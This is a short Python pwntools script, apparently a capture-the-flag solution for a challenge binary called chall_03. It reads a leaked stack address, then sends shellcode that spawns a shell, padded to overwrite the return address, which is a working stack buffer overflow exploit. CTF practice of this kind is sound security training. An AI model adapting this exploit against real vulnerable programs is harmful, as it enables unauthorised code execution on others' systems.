from pwn import *
import re
'''
#Chall_03 exploit
'''
context.arch="amd64"

binary = context.binary = ELF('./chall_03')
p = process(binary.path)
resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
leak_as_int = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
#p.recvuntil("leak :) ")
leak =hex(leak_as_int)

payload = b''
payload += asm(shellcraft.sh())
payload += b"A" * (148 - len(payload)) + p64(leak)
p.sendline(payload)
p.interactive()
